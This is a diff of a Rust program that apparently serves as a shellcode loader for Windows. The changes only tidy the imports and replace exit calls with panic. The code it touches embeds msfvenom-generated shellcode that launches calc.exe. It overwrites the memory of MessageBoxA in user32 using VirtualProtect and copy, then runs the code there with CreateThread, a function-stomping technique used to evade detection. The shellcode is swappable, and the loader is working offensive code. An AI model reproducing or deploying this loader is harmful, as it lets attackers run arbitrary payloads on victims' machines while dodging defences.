@@ -1,17 +1,19 @@
-use std::ffi::c_void;
-use std::ptr::{null, null_mut};
-use std::{mem::transmute, process::exit, ptr::copy};
-use windows::core::s;
-use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
-use windows::Win32::System::Memory::{
-    VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
+use std::{
+    ffi::c_void,
+    mem::transmute,
+    ptr::copy,
+    ptr::{null, null_mut},
 };
-use windows::Win32::System::Threading::{
-    CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS,
+use windows::{
+    core::s,
+    Win32::System::{
+        LibraryLoader::{GetProcAddress, LoadLibraryA},
+        Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
+        Threading::{CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS},
+    },
 };
 
 fn main() {
-
     // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
     let shellcode: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -35,30 +37,30 @@ fn main() {
         0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
     ];
     unsafe {
-
-        let hmodule = LoadLibraryA(s!("user32")).unwrap_or_else(|e| {
-            eprintln!("[!] LoadLibraryA Failed With Error: {e}");
-            exit(-1);
+        let h_module = LoadLibraryA(s!("user32")).unwrap_or_else(|e| {
+            panic!("[!] LoadLibraryA Failed With Error: {e}");
         });
 
-        let func = GetProcAddress(hmodule, s!("MessageBoxA")).unwrap_or_else(|| {
-            eprintln!("[!] GetProcAddress Failed");
-            exit(-1);
+        let func = GetProcAddress(h_module, s!("MessageBoxA")).unwrap_or_else(|| {
+            panic!("[!] GetProcAddress Failed");
         });
 
         let func_ptr = transmute::<_, *mut c_void>(func);
-        
+
         let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
         VirtualProtect(func_ptr, shellcode.len(), PAGE_READWRITE, &mut oldprotect).unwrap_or_else(|e| {
-            eprintln!("[!] VirtualProtect (1) Failed With Error: {e}");
-            exit(-1);
+            panic!("[!] VirtualProtect (1) Failed With Error: {e}");
         });
 
         copy(shellcode.as_ptr(), func_ptr as *mut u8, shellcode.len());
 
-        VirtualProtect(func_ptr, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut oldprotect).unwrap_or_else(|e| {
-            eprintln!("[!] VirtualProtect (2) Failed With Error: {e}");
-            exit(-1);
+        VirtualProtect(
+            func_ptr,
+            shellcode.len(),
+            PAGE_EXECUTE_READWRITE,
+            &mut oldprotect,
+        ).unwrap_or_else(|e| {
+            panic!("[!] VirtualProtect (2) Failed With Error: {e}");
         });
 
         let hthread = CreateThread(
@@ -68,10 +70,8 @@ fn main() {
             Some(null()),
             THREAD_CREATION_FLAGS(0),
             Some(null_mut()),
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] CreateThread Failed With Error: {e}");
-            exit(-1);
+        ).unwrap_or_else(|e| {
+            panic!("[!] CreateThread Failed With Error: {e}");
         });
 
         WaitForSingleObject(hthread, INFINITE);
